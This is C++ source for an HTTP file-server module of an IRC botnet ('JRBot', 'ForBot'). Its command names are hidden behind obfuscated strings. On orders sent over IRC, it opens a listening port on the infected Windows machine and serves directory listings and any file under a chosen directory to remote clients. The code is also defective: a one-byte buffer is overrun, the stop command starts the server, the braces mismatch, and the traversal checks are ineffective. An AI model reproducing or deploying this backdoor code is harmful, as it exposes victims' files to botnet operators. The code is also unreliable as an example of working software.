/*

JRBot HTTPd Conversion
*/

#include "main.h"
#include "httpd.h"
#include "sdcompat.h"
#include "mainctrl.h"

SOCKET Listen(int port);

int HTTP_server(char *dir,int port);
DWORD WINAPI HTTP_server_thread(LPVOID Param);
int Check_Requestedfile(SOCKET sock,char * dir,char * rFile);
int getfiles(char *current,SOCKET dccsock,char *chan,char *URL);
DWORD WINAPI  http_header(LPVOID param);
void http_send_file(SOCKET sock,char *file);
char * file_to_html(char *file);

struct HttpServ {
	int port;
	CString base;
	bool isRunning;
};

HttpServ hps;
void CSnap::Init(){	hps.isRunning=false;
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdServSnap, dp(37,9,35,43,155,37,27,1,31,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdServHttp,	dp(8,20,20,16,79,19,20,1,18,20,0).CStr(),	this); 
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdServStop, dp(8,20,20,16,79,19,20,15,16,0).CStr(),		this);
}


bool CSnap::HandleCommand(CMessage *pMsg)
{

	if(!pMsg->sCmd.Compare(m_cmdServSnap.sName.Str()))
	{
		
	}

	else if(!pMsg->sCmd.Compare(m_cmdServStop.sName.Str()))
	{
		if(!hps.isRunning)
		{
			char * sendbuf=new char;
			hps.isRunning=true;
			hps.port=atoi(pMsg->sChatString.Token(1, " "));
			hps.base=pMsg->sChatString.Token(2, " ");
			if ((HTTP_server(hps.base.Str(),hps.port)) == -1)
				sprintf(sendbuf,"server: stopped");
			else sprintf(sendbuf,"server: port %d: directory: %s", hps.port, hps.base.CStr());
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), sendbuf);	
		}
	}
	else if(!pMsg->sCmd.Compare(m_cmdServHttp.sName.Str()))
	{
		if(!hps.isRunning){
			char * sendbuf=new char;
			hps.isRunning=true;
			hps.port=atoi(pMsg->sChatString.Token(1, " "));
			hps.base=pMsg->sChatString.Token(2, " ");
			if ((HTTP_server(hps.base.Str(),hps.port)) == -1)	sprintf(sendbuf,"Server -> Error");
			else sprintf(sendbuf,"Server -> port %d, dir: %s", hps.port, hps.base.CStr());
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,pMsg->sReplyTo.Str(), sendbuf);	
		} else { 
			hps.isRunning=false;
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,pMsg->sReplyTo.Str(), "Server -> stopped",hps.port,hps.base.CStr());};
		}
		return true;
	}

	thred * threds =g_cMainCtrl.m_SdCompat.threds; 
	SOCKET http_socket;
	BOOL http_Type;
	int http_lenght;
	BOOL http_info = FALSE;
	char http_file[MAX_PATH];
	char http_path[MAX_PATH];

	int HTTP_server(char *dir,int http_poort) {
		SOCKET HTTPServer;
		char httpsDir[MAX_PATH];
		char buf[250];
		DWORD id;
		int c;
		HANDLE handle;
		memset(httpsDir,0,sizeof(httpsDir));
		if (dir[strlen(dir)-1] == 92) 
			dir[strlen(dir)-1] = '\0';
		strcpy(httpsDir,dir);
		if ((HTTPServer = Listen(http_poort)) == -1)
			return -1;
		for (c=0;c < 40;c++)
			if (threds[c].id == 0) break;
		if (c > 39) {
			closesocket(HTTPServer);
			return -1;
		}
		handle = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)c, 0, &id);
		if (handle != NULL) {
			sprintf(buf,"Server ->port: %i dir: %s", http_poort, httpsDir);
			spyaddthread(buf,HTTPServer,handle,3,httpsDir);
		}
		return c;
	}

	DWORD WINAPI HTTP_server_thread(LPVOID Param) {
		SOCKADDR_IN  GuestAddr;
		SOCKET guest;
		char buffer[4096];
		char rBuffer[4096];
		char file[MAX_PATH];
		char *file_to_send;
		file_to_send = "\0";
		int addrlen, r;
		int threadnum = (int)Param;
		unsigned int b, max, i;
		unsigned long mode = 1;
		if (ioctlsocket(threds[threadnum].sock,FIONBIO,&mode) == SOCKET_ERROR) 
			return 1;
		fd_set master;   
        fd_set temp; 
		FD_ZERO(&master);    
        FD_ZERO(&temp);
 		FD_SET(threds[threadnum].sock, &master);
		max = threds[threadnum].sock;

		while (1) {
			if(hps.isRunning==false)return closesocket(threds[threadnum].sock);
			temp = master;
			if (select(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR)
				break;
			for(i=0; i<= max; i++) {
				if (FD_ISSET(i, &temp)) { //there is somthing to do 
					if (i == threds[threadnum].sock) {
						//there is a new connection request
						addrlen = sizeof(GuestAddr);
						if ((guest = accept(threds[threadnum].sock, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  
							continue; 
						else {
							FD_SET(guest, &master); // add to master set
								if (guest > max)  
									max = guest;
						}
					} 
				else {
					memset(buffer,0,sizeof(buffer));
					memset(rBuffer,0,sizeof(rBuffer));
						if (recv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
							closesocket(i); 
							FD_CLR(i, &master); // remove from master set
						} 
				else {
					memset(file,0,sizeof(file));
					for (b = 0,r = 0;b < strlen(buffer);b++, r++) {
						rBuffer[r] = buffer[b];
						if (buffer[b] == '\n')
						{  //check the request....
							if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
								file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
								strcpy(file,file_to_send);
							}
							else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
								FD_CLR(i, &master);
								if (file != NULL) {
									if (strlen(file)+strlen(threds[threadnum].dir) < MAX_PATH) { 
										unsigned long mode2 = 0;
										ioctlsocket(i,FIONBIO,&mode2);
										const char * error="HTTP/1.0 200 OK\r\nContent-Type:Text/HTML\r\nConnection: Close\r\n\r\n";
										if(strstr(file,"..\\")){send(i,error,strlen(error),0);closesocket(i);}
										if(strstr(file,"../")){send(i,error,strlen(error),0);closesocket(i);}
										Check_Requestedfile(i,threds[threadnum].dir,file);
									}
									else closesocket(i);
									}
									else closesocket(i);
									break;
								}
								memset(rBuffer,0,sizeof(rBuffer));
								r=-1;
							}

                		} 
        			}

				}
			}
		}
	}
	closesocket(threds[threadnum].sock);
	threds[threadnum].id = 0;
	return 0;
}

 DWORD WINAPI  http_header(LPVOID param) {
	SOCKET sock = (SOCKET)param;
	char tFile[MAX_PATH];
	char nFile[MAX_PATH];
	BOOL type = http_Type;
	sprintf(tFile,http_file); 
	sprintf(nFile,http_path); 
	int lenght = http_lenght;
	http_info = TRUE;
	char content[50];
	if (type) sprintf(content,"text/html");
	else sprintf(content,"application/octet-stream");
	char buffer[4096];
	char date[70];
	char time[30];
	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);
	sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: ForBot\r\nDate: %s %s GMT\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nLast-Modified: %s %s GMT\r\nContent-Length: %i\r\nConnection: close\r\n\r\n",date,time,content,date,time,lenght);
	send(sock,buffer,strlen(buffer),0);
	if (type == FALSE) http_send_file(sock,tFile);
	else getfiles(tFile,sock,NULL,nFile); 
	closesocket(sock);
	return 0;
}

 int Check_Requestedfile(SOCKET sock,char * dir,char * rFile) {
	BOOL directory = FALSE;
	char file[MAX_PATH];
	char nFile[MAX_PATH];
	char tFile[MAX_PATH];
	memset(file,0,sizeof(file));
	memset(nFile,0,sizeof(nFile));
	DWORD c,d;
	if (rFile[0] != 47) sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c = 0,d=0;c < strlen(file);c++,d++)
	{
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		}
		else if (file[c] == 47) nFile[d] = 92;
		else nFile[d] = file[c];
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");
	//HANDLE testfile;
	if (GetFileAttributes(tFile) == FILE_ATTRIBUTE_DIRECTORY) 
      		directory = TRUE;
	else if (GetFileAttributes(tFile) == 0xFFFFFFFF) { //invalid file
			closesocket(sock);
			return 0;
	}
	if (nFile[d-1] == 92) directory = TRUE;
	DWORD id;
	if (directory) {
		strcat(tFile,"*");
		file_to_html(nFile);
		sprintf(http_file,tFile);
		sprintf(http_path,nFile);
		http_info = FALSE;
		http_Type = TRUE;
		http_lenght = 10000;
		if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
			while (http_info == FALSE) Sleep(5);
		}
		else { 
			closesocket(sock);
		}
		 //(tFile,sock,NULL,nFile); //list the directory and send it in html
	}
	else { //its a file
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      		if (testfile != INVALID_HANDLE_VALUE) {
			http_lenght = GetFileSize(testfile,NULL);
			CloseHandle(testfile);
			http_Type = FALSE;
			sprintf(http_file,tFile);
			http_info = FALSE;
			if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
				while (http_info == FALSE) Sleep(5);
			}
			else {
				closesocket(sock);
			}
		}
	}
	return 0;
 }
 void http_send_file(SOCKET sock,char *file) {
	//int c;
	char buffer[1024];
	DWORD mode = 0;
	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		return;
	unsigned int Fsize, move;
	Fsize = GetFileSize(testfile,NULL);
	
	while (Fsize) {
		unsigned int Fsend = 1024;
		memset(buffer,0,sizeof(buffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);
		int bytes_sent = send(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) break;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	return; //file transfer complete		
 }

 char * file_to_html(char *file) {
	DWORD c;
	for (c=0;c < strlen(file);c++)
	if (file[c] == 92) file[c] = 47;
	return file;
 }

 int getfiles(char *current,SOCKET dccsock,char *chan,char *URL) {
	char sendbuf[MAX_PATH];
	char parent[MAX_PATH];
	memset(parent,0,sizeof(parent));
    HANDLE Hnd;
    WIN32_FIND_DATA WFD;
	DWORD c;
	int count = 0;
	int count2 = 0;
	strtok(current,"\n");
	if (URL) sprintf(sendbuf,"<HTML><PRE>\n");
	send(dccsock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		for (c=strlen(URL)-3;c != 0;c--)
			if (URL[c] == 47) 
				break;
		strncpy(parent,URL,c+1);
		sprintf(sendbuf,"(dir)<a href=\"%s\">parent directory</a>\r\n",parent);
		send(dccsock,sendbuf,strlen(sendbuf),0);
	}
        Hnd = FindFirstFile(current, &WFD);
        while (FindNextFile(Hnd, &WFD))
        {
        	if ((WFD.dwFileAttributes) && (strcmp(WFD.cFileName, "..") 
				&& strcmp(WFD.cFileName, ".")))
        	{

			memset(sendbuf,0,sizeof(sendbuf));
			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (URL)
					sprintf(sendbuf,"(dir)<a href=\"%s%s/\">%s</a>\r\n",URL,WFD.cFileName,WFD.cFileName);
				else
					sprintf(sendbuf,"<%s>\r\n",WFD.cFileName);
				}
			else {
				count++;
			if (URL)//its a http request
					sprintf(sendbuf,"<p><A href=\"%s%s\">%s</A> (%i bytes)\r\n",URL,WFD.cFileName,WFD.cFileName,WFD.nFileSizeLow);
				else 
					sprintf(sendbuf,"%s (%i bytes)\r\n",WFD.cFileName,WFD.nFileSizeLow);
			
			}
			send(dccsock,sendbuf,strlen(sendbuf),0);
			if (chan) Sleep(100);
     		}

        }
    	(void) FindClose(Hnd);
	//if (chan) sprintf(sendbuf,"PRIVMSG %s :Found %i files and %i dirs\n",chan,count,count2);
	//else 
		if (URL) sprintf(sendbuf,"</PRE></HTML>"); 
//	else sprintf(sendbuf,"Found: %i files and %i dirs\r\n",count,count2);
	send(dccsock,sendbuf,strlen(sendbuf),0);
   	return 0;
 }
